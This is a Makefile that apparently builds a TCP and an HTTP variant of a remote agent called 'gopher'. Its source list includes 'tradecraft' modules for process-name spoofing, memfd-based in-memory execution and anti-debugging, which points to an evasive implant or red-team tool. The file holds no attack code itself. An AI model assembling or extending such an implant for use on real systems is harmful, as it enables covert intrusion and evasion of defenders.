CC      = gcc
CFLAGS  = -Wall -Wextra -std=c11 -O2 -D_GNU_SOURCE
INCS    = -Iinclude -Ilib/mpack -Ilib/miniz
COMMON  = src/net.c src/crypt.c src/pack.c src/os_info.c src/tasks.c \
          src/tradecraft/spoof_name.c src/tradecraft/memfd_exec.c src/tradecraft/anti_debug.c \
          lib/mpack/mpack.c lib/miniz/miniz.c
LDCOMMON = -lcrypto -lpthread -lutil
OUT    ?= agent.bin

tcp: OUT = gopher-tcp
tcp: $(COMMON) src/main_tcp.c
	$(CC) $(CFLAGS) $(INCS) -o $(OUT) src/main_tcp.c $(COMMON) $(LDCOMMON)

http: OUT = gopher-http
http: $(COMMON) src/main_http.c src/net_http.c
	$(CC) $(CFLAGS) $(INCS) -o $(OUT) src/main_http.c src/net_http.c $(COMMON) $(LDCOMMON) -lcurl

tcp-debug: CFLAGS += -O0 -g
tcp-debug: OUT = gopher-tcp
tcp-debug: $(COMMON) src/main_tcp.c
	$(CC) $(CFLAGS) $(INCS) -o $(OUT) src/main_tcp.c $(COMMON) $(LDCOMMON)

http-debug: CFLAGS += -O0 -g
http-debug: OUT = gopher-http
http-debug: $(COMMON) src/main_http.c src/net_http.c
	$(CC) $(CFLAGS) $(INCS) -o $(OUT) src/main_http.c src/net_http.c $(COMMON) $(LDCOMMON) -lcurl

clean:
	rm -f gopher-tcp gopher-http $(OUT)

.PHONY: tcp http tcp-debug http-debug clean
